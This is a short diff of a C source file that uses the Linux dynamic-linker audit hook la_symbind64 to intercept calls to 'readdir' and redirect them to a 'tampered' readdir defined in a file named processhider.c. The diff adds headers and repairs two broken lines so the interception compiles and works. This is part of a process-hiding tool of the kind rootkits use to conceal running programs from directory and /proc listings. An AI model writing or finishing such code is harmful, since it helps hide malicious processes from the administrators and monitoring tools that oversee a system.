@@ -1,5 +1,6 @@
 #define _GNU_SOURCE
-
+#include <stdlib.h>
+#include <link.h>
 #include <stdio.h>
 #include <dlfcn.h>
 #include <dirent.h>
@@ -112,8 +113,7 @@ uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx, uintptr_t *refcook, uin
     if (strcmp(symname, "readdir") == 0)
     {
         fprintf(stderr, "'readdir' is called, intercepting.\n");
-        readdir is the tampered function declared in processhider.c
-        return readdir; fix here
+        return readdir;
     }
     return sym->st_value;
 }
